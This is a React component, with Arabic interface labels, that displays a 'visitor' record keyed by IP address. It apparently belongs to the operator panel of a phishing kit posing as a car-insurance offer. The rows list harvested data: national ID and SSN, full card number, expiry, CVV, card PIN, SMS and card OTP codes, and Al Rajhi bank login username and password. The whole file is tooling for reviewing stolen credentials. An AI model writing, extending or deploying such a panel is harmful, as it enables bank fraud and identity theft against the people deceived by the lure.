// src/components/InfoModal.js
import React from "react";
import { Modal, Button } from "react-bootstrap";

export default function InfoModal({ ip, user, onClose }) {
  const rows = [
    ["الاسم الكامل",       user.userName],
    ["رقم الجوال",           user.phoneNumber],
    ["رقم الهوية",       user.idNumber],
    ["نوع العرض",      user.offerType],
    ["نوع التسجيل",        user.regType],
    ["تاريخ الميلاد",      user.birthDate],
    ["الرقم التسلسلي",        user.serialNumber],
    ["سنة الصنع",        user.carYear],
    ["ماركة السيارة",        user.carMake],
    ["نوع الاستخدام",      user.usageType],
    ["المدينة",            user.city],
    ["تاريخ البدء",      user.startDate],
    // دلة الجديدة
    ["البريد الإلكتروني",           user.email],
    ["رقم الهوية (SSN)",             user.ssn],
    ["نوع الطلب",    user.request_type],
    ["المنطقة",          user.region],
    ["الفرع",          user.branch],
    ["المستوى",           user.level],
    ["نوع الجير",       user.gear_type],
    ["الفترة الزمنية",     user.time_period],
    ["شركة التأمين",    user.company],
    ["نوع الخطة",       user.planType],
    ["سعر الخطة",      user.planPrice],
    ["الإضافات",          Array.isArray(user.addons) ? user.addons.join(", ") : user.addons],
    ["إجمالي الإضافات",    user.addonsTotal],
    ["الإجمالي",           user.total],
    ["طريقة الدفع",  user.paymentMethod],
    ["صاحب البطاقة",     <span dir="ltr" style={{ unicodeBidi: "plaintext" }}>{user.cardHolderName}</span>],
    ["رقم البطاقة",          <span dir="ltr" style={{ unicodeBidi: "plaintext" }}>{user.cardNumber}</span>],
    ["تاريخ الانتهاء",          <span dir="ltr" style={{ unicodeBidi: "plaintext" }}>{user.expiryDate}</span>],
    ["الرمز السري (CVV)",             <span dir="ltr" style={{ unicodeBidi: "plaintext" }}>{user.cvv}</span>],
    ["رمز التحقق (OTP)",             user.verificationCode],
    ["رمز البطاقة (PIN)",             user.pin],
    ["رقم الجوال",         user.phoneNumber],
    ["المشغل",        user.operator],
    ["OTP الجوال",       user.phoneCode],
    ["مستخدم الراجحي",      user.rajhiUsername],
    ["كلمة مرور الراجحي",      user.rajhiPassword],
  ];

  return (
    <Modal show onHide={onClose} size="lg" centered dir="rtl">
      <Modal.Header closeButton>
        <Modal.Title>معلومات الزائر — {ip}</Modal.Title>
      </Modal.Header>
      <Modal.Body className="text-right">
        {rows.map(([label, val]) => (
          <p key={label}><strong>{label}:</strong> {val ?? "—"}</p>
        ))}
      </Modal.Body>
      <Modal.Footer>
        <Button variant="secondary" onClick={onClose}>إغلاق</Button>
      </Modal.Footer>
    </Modal>
  );
}
